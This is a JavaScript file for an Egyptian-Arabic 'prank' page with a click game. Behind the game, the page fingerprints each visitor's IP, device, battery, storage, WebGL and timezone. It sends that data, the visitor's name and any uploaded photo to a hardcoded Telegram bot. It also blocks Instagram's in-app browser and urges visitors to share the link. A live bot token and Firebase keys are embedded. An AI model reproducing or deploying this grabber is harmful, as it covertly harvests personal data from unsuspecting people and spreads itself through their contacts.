// استيراد الوحدات اللازمة من Firebase
import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
import { getDatabase, ref, runTransaction, onValue } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';
import Swal from 'https://cdn.jsdelivr.net/npm/sweetalert2@11/+esm';

// إعداد تكوين Firebase
const firebaseConfig = {
    apiKey: "AIzaSyB1tz9GzYtSKapfXEOlAijVV1rBgKzkqbA",
    authDomain: "login-c45d2.firebaseapp.com",
    databaseURL: "https://login-c45d2-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "login-c45d2",
    storageBucket: "login-c45d2.firebasestorage.app",
    messagingSenderId: "191604294811",
    appId: "1:191604294811:web:f005b0b9e95696bb01723e",
    measurementId: "G-VQLFDFJXT8"
};

// دالة للكشف عن متصفح إنستغرام
function isInstagramBrowser() {
    const ua = navigator.userAgent || navigator.vendor || window.opera;
    return /Instagram/.test(ua);
}

// التحقق من متصفح إنستغرام عند تحميل الصفحة
window.onload = () => {
    if (isInstagramBrowser()) {
        Swal.fire({
            title: '🚫 ممنوع الدخول!',
            text: 'الموقع ده مش بيشتغل على متصفح إنستغرام. افتحه في Chrome أو Safari عشان تقدر تستخدمه.',
            icon: 'error',
            confirmButtonColor: '#8e24aa',
            background: '#1e1e1e',
            color: '#e0e0e0',
            confirmButtonText: 'ماشي',
            allowOutsideClick: false,
            allowEscapeKey: false
        }).then(() => {
            // إعادة توجيه المستخدم إلى متصفح خارجي (اختياري)
            window.location.href = 'https://www.google.com';
        });
        return; // إيقاف تنفيذ باقي الكود
    }

    // تهيئة Firebase فقط إذا لم يكن المتصفح إنستغرام
    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // مرجع لعداد الزوار
    const counterRef = ref(db, 'visits/counter');

    // إعدادات تليجرام
    const TELEGRAM_BOT_TOKEN = '8179260298:AAECPoAzoyCu3l3vK4Uxeg3qdVlMO4wJfwE';
    const TELEGRAM_CHAT_ID = '1987268737';

    // دالة لتحويل الأرقام إلى عربية
    function toArabicNumerals(number) {
        const arabicNumerals = ['٠', '١', '٢', '٣', '٤', '٥', '٦', '٧', '٨', '٩'];
        return String(number).replace(/[0-9]/g, (digit) => arabicNumerals[digit]);
    }

    // رسائل ديناميكية باللهجة المصرية العامية
    const loadingMessages = [
        "🔍 بنفحص النظام... استنّى ثواني يا كبير! 🛠️",
        "🕵️‍♂️ بنعمل سكان لجهازك... قربنا نخلّص! ⚙️",
        "⏳ بنشيك على الحماية... ثواني ونكون جاهزين! 🔒",
        "📡 بنبص على إشارة النت... كده تمام! 🌐",
        "🔍 بنفحّص مواصفات جهازك... جهازك زي البمب! 💻"
    ];

    const prankMessages = [
        "😱 إيه الحكاية؟ البيانات راحت في المريخ! 😄",
        "🚨 تحذير! سجلّك عندنا في السيرفر! 😎",
        "👾 جهازك بقى تابع لينا... هات من الآخر! 😜",
        "🌌 البيانات بتاعك بتسافر في الكون! 😄",
        "📡 سيطرنا على جهازك... كده زي الحلاوة! 😅",
        "🛠️ النظام بقى تحت إيدينا... إنت جامد! 😜"
    ];

    const thankYouMessages = [
        "🎉 إنت جامد يا {name}! كسبت الحركة دي! 🏆",
        "🥳 يا {name}، كده زي الحلاوة! شارك صحابك! 😏",
        "👏 يا برنس يا {name}! إنت أسطورة الحركة! 😄",
        "🚀 يا {name}، هات من الآخر! إنت كبير! 😎"
    ];

    const consoleMessages = [
        "بنجهّز السيستم...",
        "بنخش على النظام...",
        "بنفكّ البيانات...",
        "بنبعت للسيرفر...",
        "بنعدّي الحماية...",
        "بنعبّي الداتا..."
    ];

    // دالة لاختيار رسالة عشوائية
    function getRandomMessage(messages) {
        return messages[Math.floor(Math.random() * messages.length)];
    }

    // دالة لإرسال رسالة إلى تليجرام
    async function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        try {
            console.log('جاري إرسال الرسالة إلى تليجرام...');
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
            console.log('حالة الطلب:', response.status, response.statusText);
            if (!response.ok) {
                throw new Error(`فشل الطلب: ${response.status}`);
            }
        } catch (error) {
            console.error('خطأ في إرسال الرسالة لتليجرام:', error);
            Swal.fire({
                title: 'مشكلة!',
                text: 'فشلنا نرسل الرسالة. جرب تاني أو غيّر المتصفح.',
                icon: 'error',
                confirmButtonColor: '#8e24aa',
                background: '#1e1e1e',
                color: '#e0e0e0'
            });
        }
    }

    // دالة للتحقق من الـ Spam
    function canAttempt() {
        const lastAttempt = localStorage.getItem('lastAttempt');
        const now = Date.now();
        const cooldown = 5 * 60 * 1000; // 5 دقايق
        if (lastAttempt && now - parseInt(lastAttempt) < cooldown) {
            const remainingSeconds = Math.ceil((cooldown - (now - parseInt(lastAttempt))) / 1000);
            const remainingMinutes = Math.floor(remainingSeconds / 60);
            const remainingSecondsPart = remainingSeconds % 60;
            Swal.fire({
                title: '🚫 براحة شوية يا برنس!',
                text: `مش هتعرف تبعت غير كل ٥ دقايق. استنّى ${toArabicNumerals(remainingMinutes)} دقيقة و ${toArabicNumerals(remainingSecondsPart)} ثانية.`,
                icon: 'warning',
                confirmButtonColor: '#8e24aa',
                background: '#1e1e1e',
                color: '#e0e0e0',
                confirmButtonText: 'ماشي'
            });
            return false;
        }
        localStorage.setItem('lastAttempt', now);
        return true;
    }

    // دالة لجلب عدد الزوار الحالي
    async function getVisitorCount() {
        return new Promise((resolve) => {
            onValue(counterRef, (snapshot) => {
                const count = snapshot.val() || 0;
                resolve(count);
            }, { onlyOnce: true });
        });
    }

    // دالة لتحديث عدد الزوار
    async function updateVisitorCount() {
        try {
            await runTransaction(counterRef, (currentCount) => {
                return (currentCount || 0) + 1;
            });
            const count = await getVisitorCount();
            document.getElementById('visitor-count').textContent = toArabicNumerals(count);
        } catch (error) {
            console.error('خطأ في تحديث عدد الزوار:', error);
            document.getElementById('visitor-count').textContent = 'مش متوفر';
        }
    }

    // جلب معلومات المستخدم
    async function getUserInfo(name = 'مش معروف') {
        if (!canAttempt()) return;

        try {
            let ipData = { ip: 'مش متوفر' };
            try {
                console.log('جاري جلب عنوان الـ IP...');
                const ipResponse = await fetch('https://api.ipify.org?format=json', { mode: 'cors' });
                ipData = await ipResponse.json();
            } catch (error) {
                console.error('خطأ في جلب الـ IP:', error);
            }

            const visitorCount = await getVisitorCount();
            const userAgent = navigator.userAgent || 'مش متوفر';
            const screenResolution = `${window.screen.width}x${window.screen.height}`;
            const windowSize = `${window.innerWidth}x${window.innerHeight}`;
            const language = navigator.language || 'مش متوفر';
            const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'مش متوفر';
            const onlineStatus = navigator.onLine ? 'متصل' : 'مش متصل';
            let batteryStatus = 'مش معروف';
            const platform = navigator.platform || 'مش متوفر';
            const deviceMemory = navigator.deviceMemory || 'مش معروف';
            const colorDepth = window.screen.colorDepth || 'مش معروف';
            const connectionSpeed = navigator.connection ? navigator.connection.effectiveType : 'مش معروف';
            const sessionTime = Math.round(performance.now() / 1000);
            const maxTouchPoints = navigator.maxTouchPoints || 'مش معروف';
            let storageQuota = 'مش معروف';
            let webGLVersion = 'مش معروف';
            const deviceType = /Mobile|Android|iPhone|iPad/.test(userAgent) ? 'موبايل' : 'كمبيوتر';

            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryStatus = `${toArabicNumerals(Math.round(battery.level * 100))}% (${battery.charging ? 'بيتشحن' : 'مش بيتشحن'})`;
                } catch (error) {
                    console.error('خطأ في جلب حالة البطارية:', error);
                }
            }

            if (navigator.storage && navigator.storage.estimate) {
                try {
                    const estimate = await navigator.storage.estimate();
                    storageQuota = `${toArabicNumerals(Math.round(estimate.quota / 1024 / 1024))} ميجا`;
                } catch (error) {
                    console.error('خطأ في جلب التخزين:', error);
                }
            }

            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    webGLVersion = gl.getParameter(gl.VERSION);
                }
            } catch (error) {
                console.error('خطأ في جلب WebGL:', error);
            }

            const message = `*بيانات الزبون:*\n👤 *الاسم*: ${name}\n📊 *عدد الزوار*: ${toArabicNumerals(visitorCount)}\n🖥️ *الآي بي*: ${ipData.ip}\n🌐 *المتصفح*: ${userAgent}\n📏 *دقة الشاشة*: ${screenResolution}\n🖼️ *حجم النافذة*: ${windowSize}\n🗣️ *اللغة*: ${language}\n🕒 *المنطقة الزمنية*: ${timeZone}\n📶 *الحالة*: ${onlineStatus}\n🔋 *البطارية*: ${batteryStatus}\n💻 *النظام*: ${platform}\n🧠 *الذاكرة*: ${deviceMemory} جيجا\n🎨 *عمق الألوان*: ${toArabicNumerals(colorDepth)} بت\n🌐 *سرعة النت*: ${connectionSpeed}\n⏱️ *مدة الجلسة*: ${toArabicNumerals(sessionTime)} ثانية\n👆 *نقاط اللمس*: ${maxTouchPoints}\n💾 *التخزين*: ${storageQuota}\n🖌️ *WebGL*: ${webGLVersion}\n📱 *نوع الجهاز*: ${deviceType}`;
            await sendToTelegram(message);

            const progress = document.getElementById('progress');
            progress.style.width = '100%';

            const consoleElement = document.getElementById('fake-console');
            let consoleIndex = 0;
            const consoleInterval = setInterval(() => {
                if (consoleIndex < consoleMessages.length) {
                    consoleElement.innerHTML += `${consoleMessages[consoleIndex]}<br>`;
                    consoleElement.scrollTop = consoleElement.scrollHeight;
                    consoleIndex++;
                }
            }, 800);

            let timeLeft = 5;
            const countdownElement = document.getElementById('countdown');
            const loadingMessageElement = document.getElementById('loading-message');
            const interval = setInterval(() => {
                timeLeft--;
                countdownElement.textContent = toArabicNumerals(timeLeft);
                if (timeLeft % 2 === 0) {
                    loadingMessageElement.textContent = getRandomMessage(loadingMessages);
                }
                if (timeLeft <= 0) {
                    clearInterval(interval);
                    clearInterval(consoleInterval);
                    document.getElementById('loading').classList.add('hidden');
                    const infoSent = document.getElementById('info-sent');
                    infoSent.classList.remove('hidden');
                    infoSent.classList.add('animate__fadeInUp');
                    document.getElementById('prank-message').textContent = getRandomMessage(prankMessages);
                    updateVisitorCount();
                }
            }, 1000);
        } catch (error) {
            console.error('خطأ في جلب البيانات:', error);
            Swal.fire({
                title: 'مشكلة!',
                text: 'فشلنا نجمع البيانات. جرب تاني أو غيّر المتصفح.',
                icon: 'error',
                confirmButtonColor: '#8e24aa',
                background: '#1e1e1e',
                color: '#e0e0e0'
            });
        }
    }

    // إطلاق قصاصات الورق
    function launchConfetti() {
        window.confetti({
            particleCount: 150,
            spread: 80,
            origin: { y: 0.6 }
        });
    }

    // معاينة الصورة وإخفاء زر الرفع
    document.getElementById('photo-upload').addEventListener('change', (e) => {
        const file = e.target.files[0];
        const preview = document.getElementById('photo-preview');
        const uploadButton = document.getElementById('upload-button');
        if (file) {
            preview.src = URL.createObjectURL(file);
            preview.classList.add('visible');
            uploadButton.classList.add('hidden');
        } else {
            preview.classList.remove('visible');
            uploadButton.classList.remove('hidden');
        }
    });

    // ربط زر رفع الصور بحقل الإدخال المخفي
    document.getElementById('upload-button').addEventListener('click', () => {
        document.getElementById('photo-upload').click();
    });

    // لعبة النقر السريع
    let score = 0;
    function startGame() {
        const target = document.getElementById('target');
        const gameArea = document.getElementById('game-area');
        const scoreElement = document.getElementById('score');

        function moveTarget() {
            const maxX = gameArea.clientWidth - target.clientWidth;
            const maxY = gameArea.clientHeight - target.clientHeight;
            const newX = Math.random() * maxX;
            const newY = Math.random() * maxY;
            target.style.left = `${newX}px`;
            target.style.top = `${newY}px`;
        }

        target.addEventListener('click', () => {
            score++;
            scoreElement.textContent = toArabicNumerals(score);
            moveTarget();
        });

        moveTarget();
        setInterval(moveTarget, 1000);
    }

    // دالة إنهاء اللعبة
    function endGame() {
        document.getElementById('game').classList.add('hidden');
        const thankYou = document.getElementById('thank-you');
        thankYou.classList.remove('hidden');
        thankYou.classList.add('animate__bounceIn');
        launchConfetti();
    }

    // دالة إعادة تشغيل الحركة
    function restartPrank() {
        if (!canAttempt()) return;
        document.getElementById('thank-you').classList.add('hidden');
        document.getElementById('loading').classList.remove('hidden');
        document.getElementById('loading-message').textContent = getRandomMessage(loadingMessages);
        document.getElementById('name-input').value = '';
        document.getElementById('photo-upload').value = '';
        document.getElementById('photo-preview').classList.remove('visible');
        document.getElementById('upload-button').classList.remove('hidden');
        document.getElementById('progress').style.width = '0';
        document.getElementById('fake-console').innerHTML = '';
        getUserInfo();
    }

    // ربط الأحداث
    document.getElementById('end-game-button').addEventListener('click', endGame);
    document.getElementById('retry-button').addEventListener('click', restartPrank);

    // التعامل مع إرسال النموذج
    document.getElementById('name-form').addEventListener('submit', (e) => {
        e.preventDefault();
        const name = document.getElementById('name-input').value.trim();
        const photo = document.getElementById('photo-upload').files[0];
        if (name) {
            getUserInfo(name);
            Swal.fire({
                title: 'خشّيت النظام! 🎉',
                text: `إنت جامد يا ${name}! يلا نلعب لعبة صغيرة عشان نختبر مهارتك! 😎`,
                icon: 'success',
                confirmButtonColor: '#8e24aa',
                background: '#1e1e1e',
                color: '#e0e0e0',
                confirmButtonText: 'يلا بينا'
            }).then(() => {
                document.getElementById('info-sent').classList.add('hidden');
                const game = document.getElementById('game');
                game.classList.remove('hidden');
                game.classList.add('animate__bounceIn');
                score = 0;
                document.getElementById('score').textContent = toArabicNumerals(score);
                document.getElementById('user-name').textContent = name;
                document.getElementById('thank-you-message').innerHTML = getRandomMessage(thankYouMessages).replace('{name}', name);
                startGame();
            });

            if (photo) {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CHAT_ID);
                formData.append('photo', photo);
                formData.append('caption', `صورة من ${name}`);
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).catch(error => {
                    console.error('خطأ في إرسال الصورة:', error);
                    Swal.fire({
                        title: 'مشكلة!',
                        text: 'فشلنا نرسل الصورة. جرب تاني أو غيّر المتصفح.',
                        icon: 'error',
                        confirmButtonColor: '#8e24aa',
                        background: '#1e1e1e',
                        color: '#e0e0e0'
                    });
                });
            } else {
                sendToTelegram(`*الاسم*: ${name}`);
            }
        }
    });

    // مشاركة على واتساب
    document.getElementById('share-whatsapp').addEventListener('click', () => {
        const text = encodeURIComponent("كسبت في حركة جامدة طحن! 😈 جرّبها وشوف هتعرف ولا لأ! 👉 " + window.location.href);
        window.open(`https://api.whatsapp.com/send?text=${text}`, '_blank');
    });

    // مشاركة على إنستغرام
    document.getElementById('share-instagram').addEventListener('click', () => {
        const text = encodeURIComponent("كسبت في حركة جامدة طحن! 😈 جرّبها وشوف هتعرف ولا لأ! 👉 " + window.location.href);
        window.open(`https://www.instagram.com/?url=${window.location.href}`, '_blank');
    });

    // تهيئة الموقع
    document.getElementById('loading-message').textContent = getRandomMessage(loadingMessages);
    Swal.fire({
        title: 'تحذير يا برنس! ⚠️',
        text: 'دخولك مش مصرّح... كمّل على مسئوليتك! 🔐',
        icon: 'warning',
        confirmButtonColor: '#8e24aa',
        background: '#1e1e1e',
        color: '#e0e0e0',
        confirmButtonText: 'يلا بينا'
    }).then(() => {
        getUserInfo();
    });
};
